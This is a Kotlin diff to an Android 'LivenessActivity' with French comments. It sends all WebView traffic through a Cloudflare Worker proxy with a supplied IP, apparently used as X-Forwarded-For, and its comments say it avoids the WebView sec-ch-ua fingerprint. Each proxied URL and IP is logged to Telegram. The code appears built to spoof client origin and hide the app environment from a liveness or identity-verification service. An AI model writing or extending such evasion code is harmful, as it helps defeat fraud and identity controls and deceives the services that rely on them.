@@ -139,22 +139,21 @@ class LivenessActivity : AppCompatActivity() {
                     }
                     return null
                 }
-                if (data.ip == "N/A" || data.ip.isEmpty()) {
-                    CoroutineScope(Dispatchers.IO).launch {
-                        github.sendTelegram("⚠️ IP = '${data.ip}' → natif (IP absente du JSON GitHub)")
-                    }
-                    return null
+                // Toujours proxifier, même si IP absente : évite sec-ch-ua "Android WebView"
+                // que WebView injecte au niveau réseau (invisible dans shouldInterceptRequest).
+                val workerBase = Constants.WORKER_URL.substringBeforeLast('/')
+                val targetEnc  = java.net.URLEncoder.encode(url, "UTF-8")
+                val ipLabel    = if (data.ip.isNotEmpty() && data.ip != "N/A") data.ip else "(aucune)"
+                val proxyReqUrl = if (data.ip.isNotEmpty() && data.ip != "N/A") {
+                    val ipEnc = java.net.URLEncoder.encode(data.ip, "UTF-8")
+                    "$workerBase/proxy?url=$targetEnc&ip=$ipEnc"
+                } else {
+                    "$workerBase/proxy?url=$targetEnc"
                 }
-
-                // ── Appel au Cloudflare Worker /proxy ────────────────────────
-                val workerBase  = Constants.WORKER_URL.substringBeforeLast('/')
-                val targetEnc   = java.net.URLEncoder.encode(url, "UTF-8")
-                val ipEnc       = java.net.URLEncoder.encode(data.ip, "UTF-8")
-                val proxyReqUrl = "$workerBase/proxy?url=$targetEnc&ip=$ipEnc"
 
                 CoroutineScope(Dispatchers.IO).launch {
                     github.sendTelegram(
-                        "🔄 Proxy → Worker\n🌐 IP: `${data.ip}`\n🔗 `$shortUrl`"
+                        "🔄 Proxy → Worker\n🌐 IP: `$ipLabel`\n🔗 `$shortUrl`"
                     )
                 }
 
@@ -203,7 +202,7 @@ class LivenessActivity : AppCompatActivity() {
 
                     CoroutineScope(Dispatchers.IO).launch {
                         github.sendTelegram(
-                            "✅ Proxy OK `$shortUrl`\n📦 ${bytes.size} bytes | X-Forwarded-For: ${data.ip}"
+                            "✅ Proxy OK `$shortUrl`\n📦 ${bytes.size} bytes | XFF: $ipLabel"
                         )
                     }
 
